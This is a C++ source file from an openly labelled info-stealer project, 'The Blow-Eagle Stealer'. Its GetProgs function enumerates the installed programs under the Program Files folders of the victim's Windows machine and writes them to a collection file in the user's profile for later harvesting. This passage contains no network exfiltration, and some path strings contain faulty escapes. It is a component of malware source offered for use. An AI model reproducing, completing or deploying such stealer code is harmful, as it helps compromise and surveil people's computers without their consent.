/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|													by: Nick_Vinesmoke											   |
|											https://github.com/Nick-Vinesmoke									   |
|									https://github.com/Nick-Vinesmoke/The-Blow-Eagle							   |
|==================================================================================================================|
*/

#include "../targets.h"
#include "../../config/config.h"

#include <windows.h>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <fstream>

void cursystem::GetProgs()
{
	std::string paths[2] = { 
		"C:\Program Files (x86)", 
		"C:\Program Files" 
	};

    TCHAR string[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserName((TCHAR*)string, &size);
    std::wstring ws(string);
    std::string userName(ws.begin(), ws.end());

    std::string pathToFile = "C:/Users/" + userName + config::path + "/System-Info/progs.txt";

	for (size_t i = 0; i < std::size(paths); i++)
	{
        std::string searchPath = paths[i] + "\\*";
        WIN32_FIND_DATAA fileData;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fileData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    std::string dirName(fileData.cFileName);

                    // Exclude "." and ".." directories
                    if (dirName != "." && dirName != "..") {
                        std::ofstream file(pathToFile, std::ios::app);
                        if (file.is_open())
                        {
                            file << "prog name: " << dirName << std::endl;
                        }

                        file.close();
                    }
                }
            } while (FindNextFileA(hFind, &fileData));

            FindClose(hFind);
        }
    }
}